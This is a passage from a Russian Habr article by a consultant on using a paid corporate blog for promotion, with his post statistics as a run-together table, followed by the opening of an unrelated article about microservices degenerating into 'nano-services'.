чем 10 лет моего аккаунта на хабре мне прилетел лишь один донат.  Вот тогда я и задумался о том, чтобы купить корпоративный блог, поставить в статье баннер и продавать какие-то свои продукты, используя Хабр как еще одну площадку не просто для продвижения, но и для продаж.В тот период после оплаты корпоративного блога я вполне успешно продавал свою первую книгу «CRM. Подробно и по делу». Позже пробовал продавать и свои услуги, и другие продукты.Но шло время, менялись мои интересы, да и опыт я накапливал.  Кроме собственного корпоративного блога, я несколько раз помогал вести корпоративный Хабр своим клиентам. Для некоторых из них я сам, в том числе, писал статьи. Другим больше подсказывал, как они могут использовать корпоративный блог, что им делать, чтобы получить пользу, чего стоит ожидать, каких ошибок избегать. И в целом, результаты были вполне приличными.Немного статистикиСейчас я говорю исключительно о личной статистике, т.е. данные, которые накопил я сам. Если посмотреть на мой личный блог на Хабре, можно увидеть, что на момент написания статьи у меня уже накопилось 96 личных публикаций. В корпоративном блоге – около 70 статей.Статистика корп хаба за все времяidurlназваниеавторхабыдата созданиявремя созданиядата публикациивремя публикацииоценкаголосов плюсголосов минусвсего голосовколичество комментариевколичество добавлений в избранноеколичество просмотров897132https://habr.com/ru/companies/trinion/articles/897132/Trinion CRM + Trinion Задачник. Используйте задачник и трекер рабочего времени как онлайн систему выставления счетовramil_trinionБлог компании Тринион, Drupal, Open source, Управление проектами, CRM-системы03.04.202509:5403.04.202510:26011203313896970https://habr.com/ru/companies/trinion/articles/896970/Клиентский порталramil_trinionБлог компании Тринион02.04.202521:45Не публиковалсяНе публиковался0000001895688https://habr.com/ru/companies/trinion/articles/895688/Что такое lsFusion: взгляд со стороныramil_trinionБлог компании Тринион, Java, IT-компании, Open source30.03.202508:4531.03.202508:0517171181741500894786https://habr.com/ru/companies/trinion/articles/894786/Trinion CRM бесплатная CRM системаramil_trinionБлог компании Тринион, CRM-системы, Управление продажами, Drupal27.03.202500:5827.03.202501:0502351091167894002https://habr.com/ru/companies/trinion/articles/894002/Как руководителю эффективно контролировать реализацию IT проекта?ramil_trinionБлог компании Тринион, Управление проектами, Управление разработкой24.03.202521:3324.03.202521:33-404415814892888https://habr.com/ru/companies/trinion/articles/892888/Зачем нужно предпроектное обследованиеramil_trinionБлог компании Тринион, Управление проектами, Анализ и проектирование систем, Управление разработкой20.03.202521:0520.03.202521:0543149131967892272https://habr.com/ru/companies/trinion/articles/892272/Стоит ли идти в 1С программисты в 2025 году. Прогноз развития платформы 1С на ближайшие несколько летramil_trinionБлог компании Тринион, 1С, Терминология IT, Исследования и прогнозы в IT19.03.202510:3719.03.202510:3737363391664831523890922https://habr.com/ru/companies/trinion/articles/890922/Почему я не люблю 1Сramil_trinionБлог компании Тринион, 1С, Drupal, Исследования и прогнозы в IT14.03.202511:2514.03.202511:25253010402605630302890672https://habr.com/ru/companies/trinion/articles/890672/Бесплатная система учета торговли и управления интернет магазином Trinion Торговляramil_trinionБлог компании Тринион, Drupal, CMS, ERP-системы, Веб-разработка13.03.202514:1313.03.202514:405831136825876796https://habr.com/ru/companies/trinion/articles/876796/Trinion BPMS. Бесплатная система управления бизнес процессами на базе Drupalramil_trinionБлог компании Тринион, Drupal, Бизнес-модели, Управление проектами, Help Desk Software26.01.202521:2327.01.202513:5302240121701872868https://habr.com/ru/companies/trinion/articles/872868/Тринион Задачник - бесплатная система управления проектомramil_trinionУправление проектами, Drupal, Блог компании Тринион10.01.202515:1410.01.202515:22-42795202976845726https://habr.com/ru/companies/trinion/articles/845726/Что такое MRP. Описание и практическое применениеramil_trinionАнализ и проектирование систем, Терминология IT, Исследования и прогнозы в IT, История IT, Блог компании Тринион24.09.202413:4724.09.202413:4773033143238657065https://habr.com/ru/companies/trinion/articles/657065/Что такое APIramil_trinionAPI, Блог компании Тринион23.03.202212:22Не публиковалсяНе публиковался0000005656719https://habr.com/ru/companies/trinion/articles/656719/Обзор ERP на базе Drupal 9ramil_trinionБлог компании Тринион, Drupal, ERP-системы, CRM-системы21.03.202215:0422.03.202210:453651112155663537394https://habr.com/ru/companies/trinion/articles/537394/Обзор набора программ Zoho Oneramil_trinionБлог компании Тринион, CRM-системы, Облачные сервисы14.01.202116:5714.01.202116:582810180125361535710https://habr.com/ru/companies/trinion/articles/535710/Токен в BPMN. Определение, примеры + видеоramil_trinionТерминология IT, Визуализация данных, Анализ и проектирование систем, Блог компании Тринион30.12.202014:4230.12.202014:42431403014332533786https://habr.com/ru/companies/trinion/articles/533786/Как описать бизнес-процесс в формате нотации BPMN.  Пошаговая инструкция + видеоramil_trinionБлог компании Тринион, Бизнес-модели18.12.202012:1518.12.202013:084761307633888427371https://habr.com/ru/companies/trinion/articles/427371/Видео курс «Основы работы с нотациями BPMN». Бесплатныйramil_trinionБлог компании Тринион, Анализ и проектирование систем, Бизнес-модели, Терминология IT, Управление разработкой22.10.201820:4922.10.201820:49495140559579426513https://habr.com/ru/companies/trinion/articles/426513/Построение процессной модели при внедрении программного обеспеченияramil_trinionБлог компании Тринион, Анализ и проектирование систем, Терминология IT, Управление проектами15.10.201817:4515.10.201817:4514370307634426511https://habr.com/ru/companies/trinion/articles/426511/Пример процессного подхода: предпроектное обследование промышленной компании. Пример BPMN диаграммыramil_trinionТерминология IT, Анализ и проектирование систем, Блог компании Тринион15.10.201817:2015.10.201817:20154923712164426509https://habr.com/ru/companies/trinion/articles/426509/Что такое компьютерная информационная системаramil_trinionБлог компании Тринион, Анализ и проектирование систем, Терминология IT, Управление разработкой15.10.201817:1415.10.201817:14462893235885424303https://habr.com/ru/companies/trinion/articles/424303/Сайт ZOHO zoho.com не работает по причине проблем с DNSramil_trinionБлог компании Тринион24.09.201823:2224.09.201823:22-162182002919421963https://habr.com/ru/companies/trinion/articles/421963/Бухгалтерия и бухгалтер: их роль в организацииramil_trinionБлог компании Тринион31.08.201815:2903.09.201815:10172142573347749415019https://habr.com/ru/companies/trinion/articles/415019/Маркетинг. Просто о сложномramil_trinionБлог компании Тринион, Брендинг, Интернет-маркетинг, Управление продажами24.06.201812:3524.06.201812:517169251083102582354608https://habr.com/ru/companies/trinion/articles/354608/Разбираемся с понятием BPM. Что такое управление бизнес процессамиramil_trinionУправление проектами, Управление персоналом, Терминология IT, Бизнес-модели, Блог компании Тринион28.04.201811:1928.04.201811:231520525012788892349596https://habr.com/ru/companies/trinion/articles/349596/Иерархия IT-систем и выбор программного обеспечения для организации трудаramil_trinionТерминология IT, Исследования и прогнозы в IT, IT-инфраструктура, Блог компании Тринион20.02.201821:3421.02.201800:351623730105133166349286https://habr.com/ru/companies/trinion/articles/349286/Как правильно купить 1Сramil_trinionБлог компании Тринион, 1С-Битрикс, IT-инфраструктура, Управление проектами16.02.201809:4716.02.201810:31182683407440406349180https://habr.com/ru/companies/trinion/articles/349180/Онлайн консультанты на сайте компанииramil_trinionБлог компании Тринион, Интернет-маркетинг, Повышение конверсии, Веб-разработка, Терминология IT15.02.201810:0315.02.201811:091419524152820398348618https://habr.com/ru/companies/trinion/articles/348618/Обзор системы Comindware Business Application Platformramil_trinionУправление персоналом, Анализ и проектирование систем, ECM/СЭД, Блог компании Тринион08.02.201811:1308.02.201811:13272812901811349345676https://habr.com/ru/companies/trinion/articles/345676/О единстве и борьбе противоположностей̆ в бизнесе. Взаимоотношения заказчика с исполнителемramil_trinionБлог компании Тринион, Управление продажами, Управление проектами, Управление разработкой26.12.201720:5426.12.201721:1225387132274343390https://habr.com/ru/companies/trinion/articles/343390/1С Управление торговлей редакция 11. Обзорramil_trinionУправление продажами, Терминология IT, 1С-Битрикс, Блог компании Тринион28.11.201712:0829.11.201701:132971602873808340064https://habr.com/ru/companies/trinion/articles/340064/Что такое DFD (диаграммы потоков данных)ramil_trinionБлог компании Тринион, IT-стандарты, Анализ и проектирование систем13.10.201719:3513.10.201720:4010133160124293867338444https://habr.com/ru/companies/trinion/articles/338444/ВЭДО. Внешний электронный документооборот что это и как выбиратьramil_trinionБлог компании Тринион, ECM/СЭД, Терминология IT21.09.201720:4822.09.201710:2781131494629109334466https://habr.com/ru/companies/trinion/articles/334466/C чего начать внедрение ERPramil_trinionБлог компании Тринион, ERP-системы, Управление проектами, Управление разработкой30.07.201722:0230.07.201722:14154935534632333018https://habr.com/ru/companies/trinion/articles/333018/Что такое ERP системаramil_trinionТерминология IT, ERP-системы, Блог компании Тринион13.07.201719:2214.07.201711:2015205250177215594332772https://habr.com/ru/companies/trinion/articles/332772/Моделирование бизнеса. Основные подходыramil_trinionУправление разработкой, Управление проектами, Терминология IT, Бизнес-модели, Блог компании Тринион10.07.201711:2810.07.201711:307103131215591455331946https://habr.com/ru/companies/trinion/articles/331946/Использование GAP-анализа для выявления и согласования задач по проектуramil_trinionУправление проектами, Управление продажами, Терминология IT, Бизнес-модели, Блог компании Тринион29.06.201712:2529.06.201713:10253804851784331254https://habr.com/ru/companies/trinion/articles/331254/Краткое описание BPMN с примеромramil_trinionБлог компании Тринион, Бизнес-модели, Терминология IT, Управление проектами, Управление разработкой19.06.201721:2119.06.201723:435105150336377759322832https://habr.com/ru/companies/trinion/articles/322832/Знакомство с нотацией IDEF0 и пример использованияramil_trinionБлог компании Тринион, Бизнес-модели, Терминология IT, Управление разработкой28.02.201710:2528.02.201712:4211143170187288278315538https://habr.com/ru/companies/trinion/articles/315538/Что такое Bitrixramil_trinionБлог компании Тринион, 1С-Битрикс, CMS, Веб-разработка17.11.201617:3517.11.201619:17236347011894308851313752https://habr.com/ru/companies/trinion/articles/313752/Видео описание SalesForce CRM. Субтитры на русском языкеramil_trinionБлог компании Тринион, CRM-системы, Управление продажами27.10.201610:4227.10.201612:271319625152818455313050https://habr.com/ru/companies/trinion/articles/313050/Книга о CRM. CRM. Подробно и по делуramil_trinionБлог компании Тринион, CRM-системы, Терминология IT18.10.201618:0518.10.201618:171230184824628348311794https://habr.com/ru/companies/trinion/articles/311794/Игрофикация ака геймификация в бизнесеramil_trinionУправление продажами, CRM-системы, Блог компании Тринион05.10.201613:1405.10.201613:53233294183612775311338https://habr.com/ru/companies/trinion/articles/311338/Мобильная торговля на примере Моби-Сramil_trinionБлог компании Тринион, Управление продажами29.09.201613:2129.09.201613:49990941818262311082https://habr.com/ru/companies/trinion/articles/311082/Мой Арбитр. Что это за сервис и как его использоватьramil_trinionЗаконодательство в IT, Блог компании Тринион26.09.201618:3226.09.201621:247921141565630310198https://habr.com/ru/companies/trinion/articles/310198/8 признаков инфантилизма в бизнесеramil_trinionФриланс, Управление проектами, Управление персоналом, Карьера в IT-индустрии, Блог компании Тринион16.09.201613:0519.09.201602:3325338415512231524309592https://habr.com/ru/companies/trinion/articles/309592/Обзор услуги облачная АТС Билайнramil_trinionБлог компании Тринион, CRM-системы09.09.201611:1909.09.201612:2815251035193543465308234https://habr.com/ru/companies/trinion/articles/308234/Что такое лидramil_trinionБлог компании Тринион, CRM-системы, Управление продажами22.08.201611:0822.08.201612:24816824969112997307892https://habr.com/ru/companies/trinion/articles/307892/Организация работы с Email в CRM-системеramil_trinionБлог компании Тринион, CRM-системы, Управление продажами16.08.201615:1717.08.201611:5281241604721068306170https://habr.com/ru/companies/trinion/articles/306170/Обзор системы Mango CRMramil_trinionБлог компании Тринион, CRM-системы, Управление продажами21.07.201614:3721.07.201615:4491562152715573304504https://habr.com/ru/companies/trinion/articles/304504/Коммуникации в CRMramil_trinionБлог компании Тринион, CRM-системы30.06.201615:1708.07.201601:39154974812809304054https://habr.com/ru/companies/trinion/articles/304054/1С: Управление производственным предприятием. Обзор ERP системыramil_trinionБлог компании Тринион, ERP-системы24.06.201614:0624.06.201614:1372215375059120780303464https://habr.com/ru/companies/trinion/articles/303464/10 способов злоупотребления сотрудниками своим служебным положением и методы борьбы с ними с помощью учетной системыramil_trinionБлог компании Тринион, Управление персоналом16.06.201613:5716.06.201617:01162812404612441091302408https://habr.com/ru/companies/trinion/articles/302408/Что такое SEOramil_trinionПоисковая оптимизация, Повышение конверсии, Контент и копирайтинг, Интернет-маркетинг, Блог компании Тринион01.06.201616:4601.06.201617:107201333022589529281192https://habr.com/ru/companies/trinion/articles/281192/Обзор системы bpm’onlineramil_trinionБлог компании Тринион, CRM-системы07.04.201614:4207.04.201615:27418143263355366299036https://habr.com/ru/companies/trinion/articles/299036/ПО для бизнеса. Что это такое и как выбиратьramil_trinionБлог компании Тринион, Управление проектами02.03.201600:2302.03.201600:26781942731933278125https://habr.com/ru/companies/trinion/articles/278125/Автоматизация бизнес процессов в CRM. Сравнение подходовramil_trinionБлог компании Тринион, CRM-системы, Терминология IT28.02.201619:4408.03.201623:23101662237230211277303https://habr.com/ru/companies/trinion/articles/277303/Анкетирование клиентов. Описание Zoho Surveyramil_trinionБлог компании Тринион, CRM-системы15.02.201622:4816.02.201608:5478192147530276785https://habr.com/ru/companies/trinion/articles/276785/Анализ системы Business Studioramil_trinionАнализ и проектирование систем, Блог компании Тринион08.02.201610:4015.02.201623:27770774137318276373https://habr.com/ru/companies/trinion/articles/276373/Social CRM.Сбор интереса пользователей Интернетramil_trinionБлог компании Тринион, CRM-системы01.02.201620:2802.02.201622:13101772435117357273917https://habr.com/ru/companies/trinion/articles/273917/Что такое лендингramil_trinionБлог компании Тринион, Usability, Веб-дизайн, Интерфейсы23.12.201521:4824.12.201500:0481241617309115679273025https://habr.com/ru/companies/trinion/articles/273025/Что такое BPMSramil_trinionБлог компании Тринион, Бизнес-модели, Терминология IT13.12.201521:5214.12.201500:028102121511585498273017https://habr.com/ru/companies/trinion/articles/273017/Bizagi. Описание. Примерramil_trinionБлог компании Тринион, IT-стандарты, Анализ и проектирование систем13.12.201519:0414.12.201500:088808387102390272749https://habr.com/ru/companies/trinion/articles/272749/Внедрение CRM. От регистрации лида до закрытия сделки. Кейс и поясненияramil_trinionCRM-системы, Блог компании Тринион09.12.201513:0309.12.201515:57813518011735203272421https://habr.com/ru/companies/trinion/articles/272421/Знакомство с языком программирования Deluge. Создание произвольной функции в системе Zoho CRMramil_trinionCRM-системы, Блог компании Тринион04.12.201512:0904.12.201512:0911165216169302296882https://habr.com/ru/companies/trinion/articles/296882/Описание CRM Мегапланramil_trinionБлог компании Тринион, CRM-системы01.12.201507:1902.12.201516:4971031361933477296406https://habr.com/ru/companies/trinion/articles/296406/1C CRM. Обзорramil_trinionБлог компании Тринион, CRM-системы, Управление продажами16.11.201519:3318.11.201523:3071031373379524296216https://habr.com/ru/companies/trinion/articles/296216/Инновации или гибельramil_trinionБлог компании Тринион, Интернет-маркетинг10.11.201518:0511.11.201507:1099090195711296086https://habr.com/ru/companies/trinion/articles/296086/Родственники и друзья в бизнесе. Чем это плохо и что с этим делатьramil_trinionУправление персоналом, Блог компании Тринион, Бизнес-модели05.11.201516:3805.11.201523:12131631926622603295538https://habr.com/ru/companies/trinion/articles/295538/Увеличение продаж. Практические советы от бизнес-консультантаramil_trinionБлог компании Тринион, Управление продажами20.10.201512:0220.10.201513:049909234100160295118https://habr.com/ru/companies/trinion/articles/295118/Что такое телефония в CRM и как ее выбиратьramil_trinionТерминология IT, Блог компании Тринион, CRM-системы07.10.201508:5108.10.201520:31781905134110294912https://habr.com/ru/companies/trinion/articles/294912/Zoho Reports. Из чего состоит и как с ней работатьramil_trinionУправление продажами, Блог компании Тринион29.09.201510:5711.10.201521:3399090139858294678https://habr.com/ru/companies/trinion/articles/294678/Выбор CRM. Частые вопросы и ответыramil_trinionБлог компании Тринион, CRM-системы, Управление продажами20.09.201520:1420.09.201520:282641093114265260819https://habr.com/ru/companies/trinion/articles/260819/Видео описание BPMS Bizagiramil_trinionАнализ и проектирование систем, Блог компании Тринион21.06.201523:4021.06.201523:4291011134410607257795https://habr.com/ru/companies/trinion/articles/257795/Битрикс24 CRM. Обзорramil_trinionБлог компании Тринион, CRM-системы12.05.201521:1112.05.201522:40626204631102209703256203https://habr.com/ru/companies/trinion/articles/256203/Как и зачем я пишу статьи на Хабрахабр. Личный опытramil_trinionБлог компании Тринион, Habr20.04.201519:3420.04.201519:49755481039116321384289596https://habr.com/ru/companies/trinion/articles/289596/Что такое 1С? 1С Франчайзинг.Часть 2ramil_trinionИсследования и прогнозы в IT, Блог компании Тринион14.04.201521:2114.04.201522:198911013618342289594https://habr.com/ru/companies/trinion/articles/289594/Что такое 1С? 1С Франчайзинг. Часть 1ramil_trinionИсследования и прогнозы в IT, Блог компании Тринион14.04.201521:0614.04.201522:1991011104275348289200https://habr.com/ru/companies/trinion/articles/289200/Как теряют бизнес. Реальные истории от бизнес-консультантаramil_trinionФриланс, Управление проектами, Блог компании Тринион02.04.201510:2702.04.201510:2742442462222450335286188https://habr.com/ru/companies/trinion/articles/286188/Создание интернет магазина. Часть 1ramil_trinionБлог компании Тринион, Управление e-commerce, Управление продажами25.02.201520:0725.02.201522:266821012233168073250893https://habr.com/ru/companies/trinion/articles/250893/Что такое 1С. О сложной системе простыми словамиramil_trinionПрограммирование, Анализ и проектирование систем, 1С-Битрикс, Блог компании Тринион17.02.201523:3918.02.201512:1083729660345359759249633https://habr.com/ru/companies/trinion/articles/249633/Что такое CRM-системы и как их правильно выбирать?ramil_trinionБлог компании Тринион, CRM-системы03.02.201516:1103.02.201519:03142172806031142886283878https://habr.com/ru/companies/trinion/articles/283878/Посредники или почему в России всегда «виноват» исполнитель на примере IT проектаramil_trinionБлог компании Тринион, Управление проектами, Фриланс29.01.201512:3629.01.201514:191011112116121192248281https://habr.com/ru/companies/trinion/articles/248281/Zoho CRM. Обзорramil_trinionCRM-системы, Блог компании Тринион19.01.201518:3020.01.201500:3436391280102866247059https://habr.com/ru/companies/trinion/articles/247059/Drupal — выбор бизнес консультантаramil_trinionВеб-разработка, Drupal, Блог компании Тринион30.12.201402:2630.12.201403:004221840306511182246429https://habr.com/ru/companies/trinion/articles/246429/Описание одной интеграции 1С и Битрикс, и почему я не рекомендую своим клиентам использовать такую интеграциюramil_trinionБлог компании Тринион, 1С-Битрикс, Веб-разработка22.12.201406:5922.12.201414:09213093986147116347246053https://habr.com/ru/companies/trinion/articles/246053/Guinness — «Идеальная Пинта Пива». Кейс превосходного CRM решенияramil_trinionБлог компании Тринион, CRM-системы17.12.201401:3117.12.201403:49315122753414404245615https://habr.com/ru/companies/trinion/articles/245615/Интеграция программного обеспечения. Описание процесса от бизнес консультантаramil_trinionБлог компании Тринион, .NET, Программирование11.12.201413:0711.12.201415:542202289103375244727https://habr.com/ru/companies/trinion/articles/244727/Почему 1С это плохо и почему так не любят 1С программистовramil_trinionБлог компании Тринион, 1С-Битрикс, Веб-разработка01.12.201421:4802.12.201400:5915517116187300556530630244529https://habr.com/ru/companies/trinion/articles/244529/Внедрение программного продукта. Особенности работы бизнес-консультанта. Часть III. Финальнаяramil_trinionФриланс, Блог компании Тринион29.11.201415:1130.11.201401:471113215011824514242901https://habr.com/ru/companies/trinion/articles/242901/Внедрение программного продукта. Особенности работы бизнес-консультанта. Часть IIramil_trinionБлог компании Тринион, Фриланс11.11.201410:5711.11.201411:58121326730506242747https://habr.com/ru/companies/trinion/articles/242747/Внедрение программного продукта. Особенности работы бизнес-консультанта. Часть Iramil_trinionФриланс, Блог компании Тринион10.11.201408:4110.11.201423:051113215112253617242041https://habr.com/ru/companies/trinion/articles/242041/Презентуем программный продукт. Как убедить клиента в вашем выбореramil_trinionБлог компании Тринион, Фриланс30.10.201421:3531.10.201410:02352709036999242039https://habr.com/ru/companies/trinion/articles/242039/Выбор программного продукта для клиента. Сбор требованийramil_trinionБлог компании Тринион, Фриланс30.10.201421:2830.10.201422:4947310510139531241283https://habr.com/ru/companies/trinion/articles/241283/Бизнес-консультант в малом и среднем-бизнесе. Кто это и зачем он нужен?ramil_trinionФриланс, Блог компании Тринион22.10.201417:3422.10.201418:5338513188452940241055https://habr.com/ru/companies/trinion/articles/241055/Видео описание ZOHO CRMramil_trinionБлог компании Тринион, CRM-системы21.10.201407:5521.10.201408:387114151309544239159https://habr.com/ru/companies/trinion/articles/239159/7 лучших инструментов для решения бизнес-задач от бизнес консультанта дженералистаramil_trinionАнализ и проектирование систем, Блог компании Тринион03.10.201420:2204.10.201410:053141125188027021224067https://habr.com/ru/companies/trinion/articles/224067/Profishop – решение для приема заказов от оптовых клиентовramil_trinionБлог компании Тринион25.05.201418:4827.05.201409:09313102325194516В личном блоге у меня около 100 подписчиков. В корпоративном – 437.При этом публикации в корпоративном блоге собирали уже до 6 989 132   прочтений в целом за все время их существования. Как видите, я знаю, о чем говорю. И сама моя статистика очень показательна.О покупке корпоративного блогаСегодня Хабр предлагает купить три типа корпоративного блога:БизнесГигантГигант +Я лично обычно оплачиваю тариф «Бизнес» просто потому, что я и сам не гигант. У меня нет крупной компании, соответственно, возможности вкладывать большие средства в оплату площадок для продвижения. Но давайте пройдемся по ним в целом и разберемся, на что обращать внимание.Что дает корпоративный ХабрПервое, что вы получаете, это расширенную статистику. Вы можете подключать различные счетчики, Яндекс.Метрики, Google Analytic. Это очень важно для продвижения, так как вы сможете использовать собственные метки, изучать подробные результаты, видеть, сколько людей перешло к вам на целевые ресурсы, оценивать качество рекламы и так далее.Яндекс метрикаСтатистика хабраВторое – это виджеты. При этом вы можете использовать как стандартные виджеты от Хабр, так и собственные виджеты. То есть вы можете создавать собственные виджеты, например, баннеры с собственным текстом и ссылками, после чего добавлять их к публикации. А можете пользоваться готовыми решениями от Хабр, например, виджетом для перехода на сайт или в социальные сети.Также Хабр предлагает корпоративным пользователям экспресс-аудит и анализ контент-плана. Я лично эти возможности не использовал, так как считаю, если это ваш блог – он и должен быть вашим, индивидуальным, особенным. А потому и вести его нужно самостоятельно.Третье - Это ссылки внутри статьи. Я например использовал вот такой вот баннер в конце статьи. Отличие корпоративного блога от обычной регистрацииВ целом, я уже пояснил это отличие в перечне возможностей корпоративного блога. Но для тех, кто не является постоянным пользователем Хабра, чуть-чуть подробнее поясню.В любом случае все начинается с бесплатной регистрации, после которой вы получаете личный аккаунт на Хабре, где отображаются ваши данные, которые вы решили опубликовать, а Хабр разрешает обычным пользователям, а также краткая статистика (число публикаций, число подписчиков и т.п.).При оплате корпоративного блога вы получаете отдельную карточку пользователя, расположенную по отдельному адресу. И здесь уже вы можете указывать название компании, ссылки, получать доступ к подробной статистике и другие преимущества.Использование ссылок в корпоративном блогеИтак, кроме расширенной статистики, подключения Яндекс.Метрик и Google Analytic, при оплате корпоративного блога, независимо от тарифа, вы получаете доступ к двум инструментам – ссылки и баннеры.Вы можете на своей странице разместить ссылки на свои сайты и соцсети. Можете использовать виджеты и ссылки прямо в статьях на страницы, которые вы хотите продвигать в рамках SEO или для прямых продаж.Но здесь возникают определенные сложности в определении целевой аудитории, так как сейчас на Хабре она очень размыта. Если когда-то давно, когда «и трава была зеленее», все было просто – были хабы «айтишные» и «железячные», то сейчас количество направлений огромно. И оно уже включает в числе прочих такие вещи, как здоровье, экология, IT аналитика, CRM, ERP-системы и так далее. Соответственно, сейчас категории стали очень размытыми, и точно попасть в целевую аудиторию сложно.Допустим, вы написали хорошую статью и на нее перешло 100 тысяч человек. Надеяться, что из этих 100 тысяч по вашей ссылке перейдет хотя бы 1000 человек, просто нереально. На самом деле цифры совсем другие. Если вы написали действительно качественную статью, а ее тема попала, как говорится, «в жилу», вероятнее всего в первые дни ее будут читать по 5-10 тысяч человек в день, потом активность спадет до 2-3 тысяч прочтений и менее. Но если ссылки нужны не только для прямых переходов, но и для SEO, все становится тоньше и интереснее. Даже когда окончится действие вашего корпоративного тарифа, ссылки в статье останутся и будут повышать вашу ссылочную массу.Баннеры в корпоративном блогеТеперь поговорим подробно о баннерах и методах их использования. Размещать их вы можете как внутри статьи, так и сбоку в сайдбаре. Вариант размещения в сайдбаре по моему опыту практически не работает. Так выполнен сайт – есть статья, а есть баннерная часть. И на последнюю люди обращают крайне мало внимания, в результате и переходы по этим ссылкам почти нулевые, так сказать, в рамках статистической погрешности.Происходит это не только у меня, а массово в корпоративных блогах. В целом, понять, почему это так, просто. Вспомните, когда вы в последний раз кликали на баннер в сайдбаре на Хабре? Все верно. Люди заходят прочитать статью. На ней и концентрируют свое внимание. А если вдруг что-то становится интересным, возвращаться «вверх» в сайдбар, чтоб кликнуть по баннеру, будут единицы.Баннеры внутри статьи более-менее работают. Но здесь очень многое зависит от контекста, а также от исполнения самого баннера. Таким образом, если вы хотите получать пользу от баннера, уделите максимум внимания его внешнему виду, информативности, призывам к действию, продумайте, где именно его лучше разместить в самой статье.Очень важно что баннеры находятся в сайдбаре, и кроме так называемой баннерной слепоты есть еще проблема сайдбаров. Многие люди читают с мобилы и до сайдбара не добираются, к тому же люди читают основной текст и на сайдбары почти не обращают внимания.Как написать хорошую статью для корпоративного хабаПервое, на что хотел бы обратить внимание, это само восприятие корпоративных хабов. Поначалу каждый новый корпоративный блог встречали по умолчанию настороженно и с долей негатива, ожидая там увидеть рекламу вместо полезных публикаций.Но со временем выяснилось, что корпоративные хабы генерируют намного больше контента, чем обычные пользователи, и контент этот может быть самым разным. Да и люди привыкли к такой категории публикаций. В итоге, сегодня публикации от корпоративных хабов воспринимают примерно так же, как и статьи обычных пользователей, т.е. на общих основаниях. Так что сосредоточимся на том, как все же писать статьи.Первое, с чем я лично столкнулся, это проблема в выборе темы. Люди приходят на Хабр, оплачивают корпоративный доступ и не знают, о чем писать.В принципе, если речь идет о компании, то статьи для Хабра, по логике, должен писать либо очень высококвалифицированный специалист, либо вообще, владелец бизнеса. Очень важно, чтобы по публикации было видно, что ее пишет человек, глубоко разбирающийся в тематике, связанной с компанией.Здесь я не говорю о гигантах, таких как Яндекс, Mail или ВКонтакте. Это целые экосистемы или даже планеты со своими законами, своим притяжением и т.д. Речь идет о средних компаниях или даже стартапах, как, например, у меня, которые стремятся продвинуться за счет Хабра.Нередко такие компании обращаются за помощью к профессиональным айтишникам или копирайтерам, связанным с IT-тематикой. Те пишут для них статьи на темы, никак не связанные с продвигаемым бизнесом. Это может быть история IT, какие-то разработки, рассказы о жизни айтишников, вообще «общие» темы. Некоторые из таких публикаций даже попадают в ТОП, так как читателям они интересны и написаны хорошо. Но какая польза компании-заказчику от таких публикаций, я не представляю.Есть другие подходы, более плодотворные:Ничего не придумывать, а просто писать о своей работе. Например, у меня вышел новый продукт, я о нем и пишу. Описываю подробно, что получилось, какие возможности этот продукт предлагает пользователям и т.д. Если статья написана нормально, то ее читают, плюсуют, задают вопросы. Таким образом, такие публикации вполне востребованы.Писать о технологии, которую вы используете. Т.е. вы собираете информацию об этой технологии, изучаете ее, описываете инструменты и методы их применения и т.д. Я считаю, что для корпоративного блога такой выбор темы один из самых плодотворных.А далее, чем лучше вы раскрываете тему, чем больше в нее погружаетесь, тем интереснее получается статья.Для чего еще можно использовать корпоративный хабС учетом всех возможностей, которые дает корпоративный хаб, меня лично очень заинтересовало применение этого инструмента для проверки гипотез. Я пробовал продвигать свой бизнес и через Яндекс.Директ, и с помощью SEO, и в Facebook и т.д.И корпоративный хаб стал хорошим инструментом для сбора информации и проверки гипотез о том, как видят вашу компанию, как ее воспринимают, что вы делаете правильно, а что – нет.А еще у вас появляется возможность получить, как я это называю, «второй взгляд».Представьте, что у вас – рядовая компания, о которой не пишет никто, кроме вас самих. Вы ведете свой блог на сайте, пишете о себе в социальных сетях, участвуете в выставках, конференциях, как-то себя продвигаете. Но это и все. О вас никто не напишет в новостях, так как о чем тут писать? Очередная компания, очередной продукт. В лучшем случае вы получаете отдельные короткие отзывы преимущественно в соцсетях.С появлением корпоративного хаба вы получаете возможность написать о себе, причем много и подробно. А в ответ получаете комментарии, т.е. тот самый «второй взгляд».В результате люди, которые гуглят название вашей компании, видят в выдаче не только ваши собственные публикации на ваших ресурсах, но и ссылку на статью на Хабре. А после перехода туда они также могут ознакомиться с комментариями, почитать, что думают другие люди о тех вещах, которые вы продвигаете, т.е. получить тот самый «второй взгляд».Конечно, это довольно рискованно и требует определенной подготовки. Чтобы не получить в ответ на Хабре хейт, у вас должен быть действительно хороший продукт или услуга, а также хорошо написанная статья. В комментариях обсуждать будут все – от качества публикации до сути, т.е. самого продукта или технологии, которой посвящена ваша статья.Например, если вы продвигаете свой продукт, то в комментариях могут написать, что «продукт А» хороший, а «продукт Б» плохой.  Еще и приведут аргументацию, почему это так. У меня было такое, когда мы продвигали нашу бесплатную CRM. Кроме благодарностей, я также получал обратную связь с указаниями типа «у вас в коде ошибки» Конечно, нужно быть готовым к критике, отвечать на замечания. Но если в целом продукт хороший, то и «второй взгляд» будет в общем позитивным."
88,Почему микро-сервисы редко взлетают?,Цифровой СИБУР,Компания,0,"Программное обеспечение, Дизайн и юзабилити, Мобильные технологии",2025-04-09,"Источник: thespruceeats.comПотому, что микро-сервисы часто оказываются не «микро», а «нано» сервисами. Маленькими, изолированными сервисами под конкретную маленькую задачу. Они любят полакомиться чужими событиями. Но они не жадные: поймают одно событие, кинут три. Поодиночке они почти бесполезны. Про них можно слагать анекдоты: «Сколько надо сервисов, чтобы напечатать Hello World?». Поэтому нано-сервисов много, они плодятся как зайчики. Или как маленькие паучки, которые затягивают организацию своей паутинкой. Систему нано-сервисов трудно спроектировать, легко уронить и невозможно поддерживать. «Микро» — это не «нано», микро-сервисы устроены иначе. Не скажу, что знаю рецепт хорошего микро-сервиса. Но я постараюсь показать, каким он точно не должен быть. Историческая потребность в микро-сервисах.Разберемся, для чего появились микро-сервисы. Это поможет понять, где «что-то пошло не так», и как это исправить. Обрисуем широкими мазками, с чего все начиналось.Вначале были монолиты. Потребности бизнеса росли, монолиты становились всё сложнее. Как следствие — росли и команды. Табурин Владимир «Крестьянские дети»Когда команда разрастается до десятков разработчиков, поставка ценности практически останавливается. Деление команды на группы помогает не сильно. Координация разработки, тестирования и выкладки монолита — сущий ад. Даже трудности масштабирования самого монолита отходят на второй план. Основная сложность — масштабирование разработки.По кулинарной аналогии, если вас пятеро — вы еще сможете пообедать из одного котла. А вот когда вас 